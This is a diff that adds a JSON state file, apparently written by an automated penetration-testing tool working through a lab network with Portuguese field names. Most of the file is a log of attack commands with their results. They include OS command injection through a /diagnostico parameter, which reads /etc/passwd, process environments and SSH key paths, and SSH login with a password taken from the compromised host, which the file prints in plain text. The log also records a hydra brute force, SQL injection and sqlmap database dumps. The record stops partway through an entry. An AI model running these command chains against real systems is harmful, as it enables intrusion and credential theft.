@@ -1,0 +1,1202 @@
+{
+ "hosts": [
+  {
+   "endereco": "172.20.0.5",
+   "nome": "atacante",
+   "subrede": "172.20.0.0/24",
+   "enumerado": false,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": true,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": []
+  },
+  {
+   "endereco": "172.20.0.1",
+   "nome": null,
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 111,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "rpcbind",
+     "versao": "2-4 (RPC #100000)",
+     "incerto": false
+    },
+    {
+     "porta": 55263,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "status",
+     "versao": "1 (RPC #100024)",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.10",
+   "nome": "tcc-host-web.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": "injecao de comando em /diagnostico (param destino)",
+   "origem": false,
+   "titulo": "Diagnostico de rede -- infra interna",
+   "rotas": [
+    {
+     "caminho": "/diagnostico",
+     "metodo": "GET",
+     "parametros": [
+      "destino"
+     ],
+     "porta": 8080
+    }
+   ],
+   "usuario": "root",
+   "uid": 0,
+   "caminhos": [
+    "/usr/local/bin",
+    "/root",
+    "/root/.bashrc",
+    "/root/.profile",
+    "/root/.python_history",
+    "/root/.wget-hsts",
+    "/usr/local/bin/2to3",
+    "/usr/local/bin/2to3-3.11",
+    "/usr/local/bin/flask",
+    "/usr/local/bin/idle",
+    "/usr/local/bin/idle3",
+    "/usr/local/bin/idle3.11",
+    "/usr/local/bin/pip",
+    "/usr/local/bin/pip3",
+    "/usr/local/bin/pip3.11",
+    "/usr/local/bin/pydoc",
+    "/usr/local/bin/pydoc3",
+    "/usr/local/bin/pydoc3.11",
+    "/usr/local/bin/python",
+    "/usr/local/bin/python-config",
+    "/usr/local/bin/python3",
+    "/usr/local/bin/python3-config",
+    "/usr/local/bin/python3.11",
+    "/usr/local/bin/python3.11-config",
+    "/usr/local/bin/wheel",
+    "/opt",
+    "/srv",
+    "/opt/diagnostico",
+    "/opt/diagnostico/app.py",
+    "/opt/diagnostico/config.ini",
+    "/usr/local/lib/python3.11/__pycache__/secrets.cpython-311.pyc",
+    "/usr/local/lib/python3.11/secrets.py"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [
+    "/bin/sh.real",
+    "/dev/null",
+    "/etc/resolv.conf"
+   ],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 8080,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "http-proxy",
+     "versao": "Werkzeug/3.1.9 Python/3.11.17",
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.11",
+   "nome": "tcc-host-glhf.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": false,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": "Redirecting...",
+   "rotas": [
+    {
+     "caminho": "/login",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/login",
+     "metodo": "POST",
+     "parametros": [
+      "username",
+      "password"
+     ],
+     "porta": 1337
+    },
+    {
+     "caminho": "/register",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/readme.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/nicks.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/download/rockyou.txt",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/register",
+     "metodo": "POST",
+     "parametros": [
+      "username",
+      "email",
+      "password"
+     ],
+     "porta": 1337
+    },
+    {
+     "caminho": "/user",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/direct",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/board",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/resetdb",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    },
+    {
+     "caminho": "/logout",
+     "metodo": "GET",
+     "parametros": [],
+     "porta": 1337
+    }
+   ],
+   "usuario": null,
+   "uid": null,
+   "caminhos": [],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 1337,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "http",
+     "versao": null,
+     "incerto": false
+    }
+   ]
+  },
+  {
+   "endereco": "172.20.0.12",
+   "nome": "tcc-srv-deploy.tcc-lab_dmz",
+   "subrede": "172.20.0.0/24",
+   "enumerado": true,
+   "comprometido": true,
+   "meio_de_acesso": null,
+   "origem": false,
+   "titulo": null,
+   "rotas": [],
+   "usuario": "svc_deploy",
+   "uid": 1000,
+   "caminhos": [
+    "/home/svc_deploy",
+    "/opt",
+    "/srv",
+    "/home/svc_deploy/.bash_logout",
+    "/home/svc_deploy/.bashrc",
+    "/home/svc_deploy/.profile",
+    "/usr/share/nmap/scripts/http-cookie-flags.nse",
+    "/bin/bash",
+    "/usr/local/bin",
+    "/usr/bin/env",
+    "/usr/lib/openssh/ssh-keysign",
+    "/usr/bin/chsh",
+    "/usr/bin/chfn",
+    "/usr/bin/newgrp",
+    "/usr/bin/mount",
+    "/usr/bin/su",
+    "/usr/bin/umount",
+    "/usr/bin/gpasswd",
+    "/usr/bin/passwd"
+   ],
+   "caminhos_omitidos": 0,
+   "mencionados": [],
+   "associados": {},
+   "interfaces": [],
+   "autenticacao_indiscriminada": {},
+   "servicos": [
+    {
+     "porta": 22,
+     "protocolo": "tcp",
+     "estado": "open",
+     "servico": "ssh",
+     "versao": "OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)",
+     "incerto": false
+    }
+   ]
+  }
+ ],
+ "credenciais": [
+  {
+   "usuario": "svc_deploy",
+   "tipo": "senha",
+   "segredo": "7fQx2Lm9RtVzB4kd",
+   "identidade": null,
+   "origem": "172.20.0.10",
+   "tentada_em": [
+    "172.20.0.12"
+   ],
+   "validada_em": [
+    "172.20.0.12"
+   ],
+   "recusada_em": []
+  }
+ ],
+ "alcances": [
+  {
+   "origem": "172.20.0.12",
+   "destino": "172.20.0.12",
+   "via": "172.20.0.12"
+  }
+ ],
+ "tentativas": [
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sn 172.20.0.0/24",
+   "rotulo": "nmap -sn 172.20.0.0/24",
+   "alvo": "172.20.0.0/24",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "5 hosts, 0 servicos",
+   "revisao": 2,
+   "revisao_ao_abrir": 1
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.10",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.10",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 3,
+   "revisao_ao_abrir": 2
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/",
+   "rotulo": "curl http://172.20.0.10:8080/",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 4,
+   "revisao_ao_abrir": 3
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=127.0.0.1;id",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=127.0.0.1;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "rejeitada pela guarda de escopo: fora do escopo do laboratorio: 127.0.0.1 nao pertence a nenhuma faixa deste ambiente",
+   "revisao": 4,
+   "revisao_ao_abrir": 4
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;id",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;id'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is); saida: usuario root",
+   "revisao": 6,
+   "revisao_ao_abrir": 4
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/etc/passwd;cat%20/root/*.txt%20/home/*/*.txt%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/etc/passwd;cat%20/root/*.txt%20/home/*/*.txt%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1098 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-maxdepth%204%20\\(%20-iname%20%22*flag*%22%20-o%20-iname%20%22*troféu*%22%20-o%20-iname%20%22*trophy*%22%20-o%20-iname%20%22*credential*%22%20\\)%20-print%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;find%20/%20-maxdepth%204%20\\(%20-iname%20%22*flag*%22%20-o%20-iname%20%22*troféu*%22%20-o%20-iname%20%22*trophy*%22%20-o%20-iname%20%22*credential*%22%20\\)%20-print%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 304 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 6,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.11",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.11",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 7,
+   "revisao_ao_abrir": 6
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "nc -nv 172.20.0.11 1337",
+   "rotulo": "nc -nv 172.20.0.11 1337",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "netcat falhou (codigo -1): Connection to 172.20.0.11 1337 port [tcp/*] succeeded!; 172.20.0.11:1337 aberta; a conexao abriu e o servico nao respondeu nada",
+   "revisao": 7,
+   "revisao_ao_abrir": 7
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- 172.20.0.12",
+   "rotulo": "nmap -sV -sC -p- 172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 1 servicos",
+   "revisao": 8,
+   "revisao_ao_abrir": 7
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/proc/1/environ%20/app/.env%20/app/config*%20~/.ssh/id_rsa%202>/dev/null;ls%20-la%20/root/.ssh%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/proc/1/environ%20/app/.env%20/app/config*%20~/.ssh/id_rsa%202>/dev/null;ls%20-la%20/root/.ssh%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 533 bytes de corpo, 0 credencial(is); saida: 2 caminhos novos",
+   "revisao": 9,
+   "revisao_ao_abrir": 8
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/root%20/usr/local/bin%202>/dev/null;cat%20/root/*.txt%20/root/*.key%20/root/*id_rsa*%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/root%20/usr/local/bin%202>/dev/null;cat%20/root/*.txt%20/root/*.key%20/root/*id_rsa*%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1772 bytes de corpo, 0 credencial(is); saida: 23 caminhos novos",
+   "revisao": 10,
+   "revisao_ao_abrir": 9
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/app%20/opt%20/srv%202>/dev/null;cat%20/root/.python_history%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/app%20/opt%20/srv%202>/dev/null;cat%20/root/.python_history%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 516 bytes de corpo, 0 credencial(is); saida: 3 caminhos novos",
+   "revisao": 11,
+   "revisao_ao_abrir": 10
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/opt/diagnostico%202>/dev/null;find%20/opt%20/srv%20-maxdepth%203%20-type%20f%202>/dev/null",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ls%20-la%20/opt/diagnostico%202>/dev/null;find%20/opt%20/srv%20-maxdepth%203%20-type%20f%202>/dev/null'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 507 bytes de corpo, 0 credencial(is); saida: 2 caminhos novos",
+   "revisao": 12,
+   "revisao_ao_abrir": 11
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/opt/diagnostico/app.py%20/opt/diagnostico/config.ini",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;cat%20/opt/diagnostico/app.py%20/opt/diagnostico/config.ini'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 7290 bytes de corpo, 1 credencial(is); saida: nenhum fato novo",
+   "revisao": 13,
+   "revisao_ao_abrir": 12
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "ssh svc_deploy@172.20.0.12",
+   "rotulo": "ssh svc_deploy@172.20.0.12",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 255): Pseudo-terminal will not be allocated because stdin is not a terminal.; falha de ssh",
+   "revisao": 13,
+   "revisao_ao_abrir": 13
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sshpass -p c01 ssh -o StrictHostKeyChecking=no -tt svc_deploy@172.20.0.12 id",
+   "rotulo": "sshpass -p c01 ssh -tt svc_deploy@172.20.0.12 id",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "c01 resolvida para o segredo da credencial; sessao estabelecida; saida: usuario svc_deploy",
+   "revisao": 15,
+   "revisao_ao_abrir": 13
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "sudo -l; id; ls -la /home/svc_deploy /opt /srv 2>/dev/null; find / -maxdepth 4 -iname *troféu* -o -iname *trophy* -o -iname *flag* 2>/dev/null",
+   "rotulo": "sudo '-l;' 'id;' ls -la /home/svc_deploy /opt /srv '2>/dev/null;' find / -maxdepth 4 -iname '*troféu*' '*trophy*' '*flag*' '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): bash: line 1: sudo: command not found; sessao estabelecida; saida: ferramenta ausente neste host: sudo, usuario svc_deploy, 6 caminhos novos",
+   "revisao": 17,
+   "revisao_ao_abrir": 15
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -maxdepth 6 ( -iname *troféu* -o -iname *trophy* -o -iname *flag* -o -iname *.key -o -iname *id_rsa* -o -iname *deploy* ) 2>/dev/null; cat ~/.bash_history /etc/hosts 2>/dev/null; env",
+   "rotulo": "find / -maxdepth 6 '(' -iname '*troféu*' '*trophy*' '*flag*' '*.key' '*id_rsa*' '*deploy*' ')' '2>/dev/null;' cat '~/.bash_history' /etc/hosts '2>/dev/null;' env",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "sessao estabelecida; saida: 4 caminhos novos",
+   "revisao": 18,
+   "revisao_ao_abrir": 17
+  },
+  {
+   "ferramenta": "netcat",
+   "assinatura": "bash -c printf \"HELP\\r\\n\" | nc -nv -w3 172.20.0.11 1337",
+   "rotulo": "bash -c 'printf \"HELP\\r\\n\" | nc -nv -w3 172.20.0.11 1337'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "172.20.0.11:1337 aberta; o servico respondeu HTTP, codigo 400",
+   "revisao": 19,
+   "revisao_ao_abrir": 18
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/",
+   "rotulo": "curl http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 20,
+   "revisao_ao_abrir": 19
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/login",
+   "rotulo": "curl http://172.20.0.11:1337/login",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 20
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.11:1337/download/readme.txt",
+   "rotulo": "curl http://172.20.0.11:1337/download/readme.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2322 bytes de corpo, 0 credencial(is)",
+   "revisao": 21,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i http://172.20.0.11:1337/register",
+   "rotulo": "curl http://172.20.0.11:1337/register",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 21
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -o nicks.txt http://172.20.0.11:1337/download/nicks.txt -o rockyou.txt http://172.20.0.11:1337/download/rockyou.txt",
+   "rotulo": "curl -o nicks.txt http://172.20.0.11:1337/download/nicks.txt -o rockyou.txt http://172.20.0.11:1337/download/rockyou.txt",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -X POST http://172.20.0.11:1337/login -d username=teste_invalido&password=senha_invalida",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/login -d 'username=teste_invalido&password=senha_invalida'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST http://172.20.0.11:1337/login -d username=teste_invalido&password=senha_invalida",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/login -d 'username=teste_invalido&password=senha_invalida'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1876 bytes de corpo, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "hydra",
+   "assinatura": "hydra -L nicks.txt -P rockyou.txt 172.20.0.11 -s 1337 http-post-form /login:username=^USER^&password=^PASS^:F=invalid",
+   "rotulo": "hydra -L nicks.txt 172.20.0.11 -s 1337 http-post-form '/login:username=^USER^&password=^PASS^:F=invalid'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "hydra falhou (codigo -1): tempo esgotado apos 300s; 0 senha(s), concluida=False",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -X POST http://172.20.0.11:1337/login -d username=admin'--&password=x",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/login -d 'username=admin'\"'\"'--&password=x'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 1874 bytes de corpo, 0 credencial(is)",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=senha -p username --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=senha' -p username --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 3260 bytes de resposta",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=senha -p username --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite --dump-all -v 1",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=senha' -p username --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite --dump-all -v 1",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 3182 bytes de resposta",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "sqlmap",
+   "assinatura": "sqlmap -u http://172.20.0.11:1337/login --data=username=admin&password=senha -p password --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite --dump-all -v 1",
+   "rotulo": "sqlmap -u http://172.20.0.11:1337/login '--data=username=admin&password=senha' -p password --batch --level=3 --risk=2 --technique=BEUST --dbms=sqlite --dump-all -v 1",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "executado, codigo 0, 3117 bytes de resposta",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -xdev -maxdepth 8 ( -iname *troféu* -o -iname *trophy* -o -iname *flag* -o -iname *.txt ) 2>/dev/null | grep -v -E ^/(proc|sys|usr/share|usr/lib)",
+   "rotulo": "find / -xdev -maxdepth 8 '(' -iname '*troféu*' '*trophy*' '*flag*' '*.txt' ')' '2>/dev/null' '|' grep -v -E '^/(proc|sys|usr/share|usr/lib)'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1); sessao estabelecida; saida: nenhum fato novo",
+   "revisao": 22,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "nmap",
+   "assinatura": "nmap -sV -sC -p- --min-rate 1000 172.20.0.1",
+   "rotulo": "nmap -sV -sC -p- --min-rate 1000 172.20.0.1",
+   "alvo": "172.20.0.1",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "1 hosts, 2 servicos",
+   "revisao": 23,
+   "revisao_ao_abrir": 22
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ps%20aux;echo%20---ENV---;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/environ%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%5Cn%27;%20done",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;ps%20aux;echo%20---ENV---;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/environ%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%5Cn%27;%20done'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 3733 bytes de corpo, 0 credencial(is); saida: ferramenta ausente neste host: ps",
+   "revisao": 23,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "ssh",
+   "assinatura": "find / -xdev -maxdepth 6 -perm -4000 -type f 2>/dev/null",
+   "rotulo": "find / -xdev -maxdepth 6 -perm -4000 -type f '2>/dev/null'",
+   "alvo": "172.20.0.12",
+   "redundante": false,
+   "sucesso": false,
+   "resumo": "ssh falhou (codigo 1): /usr/lib/openssh/ssh-keysign; sessao estabelecida; saida: 9 caminhos novos",
+   "revisao": 24,
+   "revisao_ao_abrir": 23
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/cmdline%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%20%27;%20echo;%20done",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;for%20p%20in%20/proc/[0-9]*;%20do%20echo%20==%24p==;%20cat%20%24p/cmdline%202>/dev/null%20|%20tr%20%27%5C0%27%20%27%20%27;%20echo;%20done'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 2906 bytes de corpo, 0 credencial(is); saida: nenhum fato novo",
+   "revisao": 25,
+   "revisao_ao_abrir": 24
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -X POST http://172.20.0.11:1337/register -d username=pentester1&email=pentester1@lab.local&password=TestPass123!",
+   "rotulo": "curl -X POST http://172.20.0.11:1337/register -d 'username=pentester1&email=pentester1@lab.local&password=TestPass123!'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c cookies.txt -X POST http://172.20.0.11:1337/login -d username=pentester1&password=TestPass123!",
+   "rotulo": "curl -c cookies.txt -X POST http://172.20.0.11:1337/login -d 'username=pentester1&password=TestPass123!'",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 200, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -b cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -b cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -L -b cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -L -b cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -D - -o /dev/null -b cookies.txt http://172.20.0.11:1337/",
+   "rotulo": "curl -D - -o /dev/null -b cookies.txt http://172.20.0.11:1337/",
+   "alvo": "172.20.0.11",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http 302, 0 credencial(is)",
+   "revisao": 25,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;echo%20---IP---;ip%20addr;echo%20---ROUTE---;ip%20route;echo%20---HOSTS---;cat%20/etc/hosts;echo%20---RESOLV---;cat%20/etc/resolv.conf",
+   "rotulo": "curl 'http://172.20.0.10:8080/diagnostico?destino=172.20.0.10;echo%20---IP---;ip%20addr;echo%20---ROUTE---;ip%20route;echo%20---HOSTS---;cat%20/etc/hosts;echo%20---RESOLV---;cat%20/etc/resolv.conf'",
+   "alvo": "172.20.0.10",
+   "redundante": false,
+   "sucesso": true,
+   "resumo": "http nao observado, 848 bytes de corpo, 0 credencial(is); saida: ferramenta ausente neste host: ip",
+   "revisao": 26,
+   "revisao_ao_abrir": 25
+  },
+  {
+   "ferramenta": "curl",
+   "assinatura": "curl -s -i -c cookies_svc.txt -X POST http://172.20.0.11:1337/login -d username=svc_deploy&password=c01",
+   "rotulo": "curl -c cookies_svc.txt -X POST http://172.20.0.11:1337/login -d 'username=svc_deploy&password=c01'",
